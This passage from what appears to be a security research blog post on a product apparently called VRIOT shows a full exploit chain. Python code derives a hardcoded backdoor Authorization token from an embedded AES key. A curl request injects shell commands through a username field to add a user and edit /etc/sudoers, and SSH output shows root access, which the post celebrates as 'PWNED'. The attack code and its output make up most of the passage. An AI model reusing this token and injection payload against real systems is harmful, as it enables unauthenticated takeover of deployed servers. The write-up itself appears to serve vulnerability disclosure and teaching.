            <span class="k">elif</span> <span class="n">value_error</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">'AES key must be either 16, 24, or 32 bytes long'</span><span class="p">:</span>
                <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">'Encryption Error: Encryption key must be either 16, 24, or 32 characters long'</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="n">value_error</span><span class="p">)</span>
</code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">n1_token</code> value can be found by grepping (spoiler: it is <strong>serviceN1authent</strong>). With all this information we can go to our python console and create the magic value:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span><span class="p">,</span> <span class="n">b64decode</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">salt</span><span class="o">=</span><span class="s">'nplusServiceAuth'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">salt</span> <span class="o">=</span> <span class="n">salt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf8"</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">enc_dec_method</span> <span class="o">=</span> <span class="s">'utf-8'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">str_key</span> <span class="o">=</span> <span class="s">'serviceN1authent'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">aes_obj</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">str_key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CFB</span><span class="p">,</span> <span class="n">salt</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">hx_enc</span> <span class="o">=</span> <span class="n">aes_obj</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="s">'TlBMVVMx'</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf8"</span><span class="p">))</span><span class="c1"># From /VRIOT/ops/scripts/haN1/service_auth
</span><span class="o">&gt;&gt;&gt;</span> <span class="n">mret</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">hx_enc</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="n">enc_dec_method</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">mret</span>
<span class="n">OlDkR</span><span class="o">+</span><span class="n">oocZg</span><span class="o">=</span>
</code></pre></div></div> <p>So setting the Authorization header to <code class="language-plaintext highlighter-rouge">OlDkR+oocZg=</code> is enough to bypass the token check and to interact with the API. We can combine this backdoor with our remote command injection:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://host/service/v1/createUser <span class="nt">-k</span> <span class="nt">--data</span> <span class="s1">'{"username": ";useradd \"exploit\" -g 27; echo  \"exploit\":\"pwned\" | chpasswd &gt;/dev/null 2&gt;&amp;1;sed -i \"s/Defaults        rootpw/ /g\" /etc/sudoers;#", "password": "test"}'</span> <span class="nt">-H</span> <span class="s2">"Authorization: OlDkR+oocZg="</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span>
</code></pre></div></div> <p>And now log in:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>X-C3LL@Kumonga:~|⇒  ssh exploit@192.168.0.20
exploit@192.168.0.20's password:
Could not chdir to home directory /home/exploit: No such file or directory
$ sudo su
[sudo] password for exploit:
root@vriot:/# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div></div> <p>So… <strong>PWNED! &gt;:)</strong>. We have a shiny unauthenticated RCE as root.</p> <h1 id="eof"> <a href="#eof" class="anchor-head"></a> EoF </h1> <p>Maybe the vulnerability was easy to spot and easy to exploit, but a root shell is a root shell. And nobody can argue with you when you have a root shell.</p> <p>We hope you enjoyed this reading! Feel free to give us feedback at our twitter <a href="https://twitter.com/AdeptsOf0xCC">@AdeptsOf0xCC</a>.</p> </div> </article> </main> <small class="post-updated-at">updated_at 25-10-2020</small> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/Leostream-XSS-to-RCE/" > <div class="nav-arrow">Previous</div> <span class="post-title">A brief encounter with Leostream Connect Broker</span> </a> <a class="post-nav-item post-nav-next" href="/kerberoast-VBA-macro/"> <div class="nav-arrow">Next</div> <span class="post-title">Hacking in an epistolary way: implementing kerberoast in pure VBA</span> </a> </nav> <footer class="footer"> <a class="footer_item" href="/feed.xml">rss</a> <span class="footer_item">&copy; 2021</span> <small class="footer_copyright"> <!-- Klisé Theme: https://github.com/piharpi/jekyll-klise --> <a href="https://github.com/piharpi/jekyll-klise" target="_blank" rel="noreferrer noopener" >klisé</a > theme on <a href="https://jekyllrb.com" target="_blank" rel="noreferrer noopener" >jekyll</a > </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
